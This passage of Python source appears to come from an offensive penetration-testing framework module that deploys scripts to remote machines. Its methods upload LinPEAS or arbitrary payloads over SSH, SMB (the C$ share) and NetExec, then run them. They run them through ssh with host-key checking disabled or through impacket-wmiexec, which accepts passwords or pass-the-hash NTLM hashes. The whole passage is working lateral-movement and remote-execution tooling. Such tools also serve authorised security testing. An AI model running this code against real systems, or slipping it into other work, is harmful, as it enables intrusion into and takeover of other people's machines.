        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        save_output = self.get_option("SAVE_OUTPUT")
        output_file = self.get_option("OUTPUT_FILE")

        if not local_file:
            return {
                "success": False,
                "error": "LOCAL_FILE not set. Please provide path to linPEAS script"
            }

        if not all([rhost, username]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME"
            }

        try:
            remote_path = "/tmp/linpeas.sh"

            # Build NXC SSH command
            cmd = ["nxc", "ssh", rhost, "-u", username]

            if ssh_key:
                cmd.extend(["--key-file", ssh_key])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or SSH_KEY provided"}

            # Upload file
            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading LinPEAS to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute LinPEAS
            exec_cmd = ["nxc", "ssh", rhost, "-u", username]

            if ssh_key:
                exec_cmd.extend(["--key-file", ssh_key])
            else:
                exec_cmd.extend(["-p", password])

            exec_cmd.extend(["-x", f"chmod +x {remote_path} && {remote_path}"])

            self.log("Executing LinPEAS...")
            exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=300)

            output = exec_result.stdout

            # Save output if requested
            if save_output and output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                self.log(f"Output saved to {output_file}", "success")

            self.log("LinPEAS execution completed", "success")
            return {
                "success": True,
                "output": output,
                "method": "nxc_ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"LinPEAS deployment failed: {str(e)}"
            }

    def deploy_script_nxc(self) -> Dict[str, Any]:
        """Deploy custom script via NetExec."""
        self.log("Deploying custom script via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        remote_path = self.get_option("REMOTE_PATH")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")
        target_os = self.get_option("TARGET_OS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Determine protocol based on OS
            if target_os.lower() == "windows":
                protocol = "smb"
                if not remote_path:
                    remote_path = f"C:\\Windows\\Temp\\{filename}"
            else:
                protocol = "ssh"
                if not remote_path:
                    remote_path = f"/tmp/{filename}"

            # Build NXC upload command
            cmd = ["nxc", protocol, rhost, "-u", username]

            if protocol == "smb":
                if domain:
                    cmd.extend(["-d", domain])

                if hash_val:
                    cmd.extend(["-H", hash_val])
                elif password:
                    cmd.extend(["-p", password])
                else:
                    return {"success": False, "error": "No PASSWORD or HASH provided"}
            else:  # SSH
                if password:
                    cmd.extend(["-p", password])
                else:
                    return {"success": False, "error": "No PASSWORD provided for SSH"}

            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading script to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = result.stdout

            # Execute if requested
            if execute:
                exec_cmd = ["nxc", protocol, rhost, "-u", username]

                if protocol == "smb":
                    if domain:
                        exec_cmd.extend(["-d", domain])
                    if hash_val:
                        exec_cmd.extend(["-H", hash_val])
                    else:
                        exec_cmd.extend(["-p", password])

                    exec_command = f"{remote_path} {exec_args}".strip()
                else:  # SSH
                    exec_cmd.extend(["-p", password])
                    exec_command = f"chmod +x {remote_path} && {remote_path} {exec_args}".strip()

                exec_cmd.extend(["-x", exec_command])

                self.log("Executing script...")
                exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=120)
                output += "\n" + exec_result.stdout

            self.log("Script deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": f"nxc_{protocol}",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NXC deployment failed: {str(e)}"
            }

    def deploy_script_ssh(self) -> Dict[str, Any]:
        """Deploy custom script via SSH."""
        self.log("Deploying custom script via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        remote_path = self.get_option("REMOTE_PATH")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name
            if not remote_path:
                remote_path = f"/tmp/{filename}"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading script to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = ""

            # Execute if requested
            if execute:
                exec_command = f"chmod +x {remote_path} && {remote_path} {exec_args}".strip()

                if ssh_key:
                    ssh_cmd = [
                        "ssh", "-i", ssh_key,
                        "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]
                else:
                    ssh_cmd = [
                        "sshpass", "-p", password,
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]

                self.log("Executing script...")
                exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=120)
                output = exec_result.stdout

            self.log("Script deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_script_smb(self) -> Dict[str, Any]:
        """Deploy custom script via SMB."""
        self.log("Deploying custom script via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, filename
            )

            if not upload_result["success"]:
                return upload_result

            # Execute if requested
            if execute:
                exec_result = self._execute_via_wmi(
                    rhost, username, password, domain, None,
                    upload_result["remote_path"],
                    exec_args
                )

                if exec_result["success"]:
                    self.log("Script deployed and executed successfully", "success")

                return exec_result
            else:
                self.log("Script uploaded successfully", "success")
                return {
                    "success": True,
                    "output": "Script uploaded (not executed)",
                    "method": "smb",
                    "remote_path": upload_result["remote_path"]
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    # ========================================================================
    # HELPER METHODS
    # ========================================================================

    def _upload_via_smb(self, rhost: str, username: str, password: str,
                        domain: str, local_file: str, remote_filename: str) -> Dict[str, Any]:
        """Helper method to upload file via SMB."""
        share = "C$"
        remote_path = f"Windows\\Temp\\{remote_filename}"
        full_remote_path = f"C:\\{remote_path}"

        auth_user = f"{domain}/{username}" if domain else username
        auth_string = f"{auth_user}%{password}"

        cmd = [
            "smbclient",
            f"//{rhost}/{share}",
            "-U", auth_string,
            "-c", f"put {local_file} {remote_path}"
        ]

        self.log(f"Uploading via SMB to {rhost}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode == 0:
            self.log("Upload successful", "success")
            return {
                "success": True,
                "remote_path": full_remote_path,
                "method": "smb"
            }
        else:
            return {
                "success": False,
                "error": f"SMB upload failed: {result.stderr}"
            }

    def _execute_via_wmi(self, rhost: str, username: str, password: str,
                         domain: str, hash_val: str, remote_path: str,
                         args: str) -> Dict[str, Any]:
        """Helper method to execute file via WMI."""
        auth = f"{domain}/{username}" if domain else username

        if hash_val:
            auth += f"@{rhost} -hashes :{hash_val}"
        elif password:
            auth += f":{password}@{rhost}"
        else:
            return {"success": False, "error": "No PASSWORD or HASH provided"}

        exec_command = f"{remote_path} {args}".strip()

        cmd = [
            "impacket-wmiexec",
            auth,
            exec_command
        ]

        self.log("Executing via WMI...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0 or "Impacket" in result.stdout:
            self.log("Execution successful", "success")
            return {
                "success": True,
                "output": result.stdout,
                "method": "wmiexec"
            }
        else:
            return {
                "success": False,
                "error": f"WMI execution failed: {result.stderr}"
            }

    def run(self) -> Dict[str, Any]:
        """Run the module."""
        return {
            "success": True,
            "message": "Select a deployment operation to continue"
        }
